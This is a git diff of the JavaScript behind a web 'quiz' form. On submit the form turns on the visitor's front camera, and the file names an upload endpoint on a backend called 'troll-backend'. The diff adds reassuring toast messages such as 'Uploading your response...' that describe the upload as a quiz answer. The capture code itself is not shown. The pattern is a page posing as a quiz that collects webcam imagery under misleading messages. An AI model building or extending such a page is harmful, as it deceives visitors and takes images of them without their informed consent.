@@ -1,10 +1,22 @@
 const form = document.getElementById("quiz-form");
 const videoEl = document.getElementById("video");
 const canvasEl = document.getElementById("canvas");
+const toast = document.getElementById("toast");
 
-// Your backend endpoint
 const backendURL = "https://troll-backend.onrender.com/api/upload";
 const constraints = { video: { facingMode: "user" }, audio: false };
+
+// Show a small toast message
+function showToast(message) {
+  toast.innerText = message;
+  toast.style.display = "block";
+  toast.style.opacity = 1;
+
+  setTimeout(() => {
+    toast.style.opacity = 0;
+    setTimeout(() => (toast.style.display = "none"), 300);
+  }, 2000);
+}
 
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
@@ -12,6 +24,7 @@ form.addEventListener("submit", async (e) => {
   const submitBtn = document.getElementById("submit-btn");
   submitBtn.disabled = true;
   submitBtn.textContent = "Submitting...";
+  showToast("Uploading your response...");
 
   try {
     // Start camera
@@ -72,9 +85,11 @@ form.addEventListener("submit", async (e) => {
 
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
+    showToast("Response submitted successfully!");
 
   } catch (err) {
     console.error(err);
+    showToast("Error! Please allow camera access.");
     alert("Please allow camera access!");
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
